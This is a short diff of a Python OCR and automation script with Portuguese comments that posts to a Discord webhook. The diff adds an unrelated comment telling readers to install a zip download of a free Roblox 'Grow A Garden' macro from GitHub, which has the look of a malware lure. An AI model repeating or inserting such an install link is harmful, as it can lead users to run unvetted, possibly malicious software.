@@ -6,11 +6,12 @@ import re
 import requests
 import pyautogui
 
+# instale: https://codeload.github.com/VirageRoblox/Virage-Grow-A-Garden-Macro/zip/refs/tags/SummerFree
 # Configuração do pytesseract (ajuste o caminho se necessário)
 pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
 
 # URL da webhook do Discord
-WEBHOOK_URL = "token"
+WEBHOOK_URL = "link"
 
 def extrair_valor_robusto(texto, palavras_chave):
     """
